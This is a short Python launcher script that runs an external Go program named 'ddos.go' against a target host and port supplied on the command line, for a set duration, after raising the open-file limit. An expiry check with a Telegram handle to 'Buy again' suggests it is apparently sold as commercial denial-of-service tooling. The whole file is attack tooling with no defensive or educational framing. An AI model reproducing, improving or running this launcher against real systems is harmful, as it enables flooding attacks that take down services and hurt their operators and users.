import subprocess
import sys
import time
import datetime

def execute_script(target, port, duration):
    command = f"ulimit -n 1000000 && go run ddos.go {target} {port} errornetworkxxx 50000 {duration} 1"
    process = subprocess.Popen(command, shell=True)
    return process

def stop_process(process):
    process.terminate()
    process.wait()

def print_banner(duration):
    print(f"Attack has been ended {duration} seconds.")

if __name__ == "__main__":
    # Check if current date is allowed
    current_date = datetime.datetime.now()
    expiration_date = datetime.datetime(2035, 5, 2)
    if current_date >= expiration_date:
        print("Access denied. Script expired :(")
        print("Buy again :- t.me/@o_404_error_o")
        sys.exit(1)

    if len(sys.argv) != 4:
        print("Usage: python script.py target port duration")
        sys.exit(1)

    target = sys.argv[1]
    port = sys.argv[2]
    duration = int(sys.argv[3])

    process = execute_script(target, port, duration)
    time.sleep(duration)
    stop_process(process)
    print_banner(duration)
